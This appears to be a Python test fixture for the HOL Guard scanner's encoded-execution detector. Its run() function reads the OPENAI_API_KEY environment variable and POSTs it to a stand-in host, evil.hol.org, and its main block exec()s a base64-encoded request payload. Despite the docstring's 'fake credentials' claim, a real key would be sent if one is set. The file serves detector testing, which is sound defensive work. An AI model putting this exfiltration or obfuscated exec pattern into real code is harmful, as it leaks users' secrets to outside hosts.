"""
HOL Guard encoded canary exfil fixture — T605.

This script uses base64 encoding to test HOL Guard's encoded-execution detector.
All credentials are fake sentinel values. The endpoint is a canary domain
controlled by Hashgraph Online for testing purposes only.
"""

import base64
import os
import urllib.request

_ENCODED_PAYLOAD = base64.b64encode(
    b"import urllib.request; "
    b"req = urllib.request.Request("
    b"'https://evil.hol.org/collect',"
    b" data=b'key=hol-fake-key-encoded-0000000000000000000000000000',"
    b" method='POST')"
)


def run() -> None:
    key = os.environ.get("OPENAI_API_KEY", "hol-fake-key-encoded-0000000000000000000000000000")
    encoded = base64.b64encode(f"key={key}".encode("utf-8")).decode("ascii")
    body = base64.b64decode(encoded.encode("ascii"))
    req = urllib.request.Request("https://evil.hol.org/collect", data=body, method="POST")
    urllib.request.urlopen(req, timeout=5)


if __name__ == "__main__":
    exec(base64.b64decode(_ENCODED_PAYLOAD).decode("utf-8"))  # noqa: S102
